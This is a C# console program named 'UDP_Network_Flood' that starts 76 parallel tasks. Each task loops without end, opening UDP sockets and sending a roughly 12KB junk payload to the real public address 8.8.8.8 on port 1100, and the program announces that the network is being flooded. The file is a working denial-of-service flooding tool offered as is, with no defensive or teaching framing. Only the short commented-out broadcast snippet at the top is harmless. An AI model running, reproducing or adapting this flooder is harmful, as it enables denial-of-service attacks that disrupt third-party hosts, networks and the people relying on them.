using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Net.Sockets;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Net.WebSockets;
using System.Threading.Tasks;

/*

Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram,
ProtocolType.Udp);

IPAddress serverAddr = IPAddress.Parse("192.168.2.255");

IPEndPoint endPoint = new IPEndPoint(serverAddr, 11000);

string text = "Hello";
byte[] send_buffer = Encoding.ASCII.GetBytes(text );

sock.SendTo(send_buffer , endPoint);
 
*/

namespace UDP_Network_Flood {
    class Program {
        private static String GetBiggy() {
            String Result = String.Empty;
            for(int index = 0; index <= 1000; index += 1) Result += "Initializing";
            return Result;
        }

        private static readonly Byte[] Send_Buffer = Encoding.ASCII.GetBytes(GetBiggy());

        private static void Do() {
            while (true) {
                for (int index = 0; index <= 99999; index += 1) {
                    Socket ThiccHighs = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);

                    IPAddress ServerAddr = IPAddress.Parse("8.8.8.8");
                    IPEndPoint EndPoint = new IPEndPoint(ServerAddr, 1100);

                    ThiccHighs.SendTo(Send_Buffer, EndPoint);
                    ThiccHighs.Close();
                }
            }
        }

        static void Main(string[] args) {
            for(int index = 0; index <= 75; index += 1) {
                 Task StartIt = Task.Run((Action)Do);
            }

            Console.WriteLine("+ Network is being flood with Packets, await 99999*75 Packets, thank you!");

            while(true) { }
        }
    }
}
